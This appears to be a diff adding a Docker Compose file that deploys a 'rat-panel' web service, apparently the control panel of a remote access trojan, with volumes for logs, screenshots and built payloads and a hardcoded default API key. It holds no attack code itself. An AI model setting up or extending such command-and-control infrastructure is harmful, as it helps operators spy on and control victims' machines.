@@ -1,0 +1,28 @@
+version: '3.8'
+
+services:
+  web-panel:
+    build: .
+    container_name: rat-panel
+    ports:
+      - "5000:5000"
+    environment:
+      - FLASK_ENV=production
+      - API_KEY=${API_KEY:-RAT_API_2025_K7mP9sQ2xL5vB8nR3tA6cD}
+      - CENTRAL_SERVER_URL=http://web-panel:5000
+    volumes:
+      - ./logs:/app/logs
+      - ./data:/app/data
+      - ./screenshots:/app/screenshots
+      - ./dist:/app/dist
+    restart: always
+    healthcheck:
+      test: ["CMD", "curl", "-f", "http://localhost:5000/api/ping"]
+      interval: 30s
+      timeout: 10s
+      retries: 3
+      start_period: 10s
+
+networks:
+  default:
+    driver: bridge
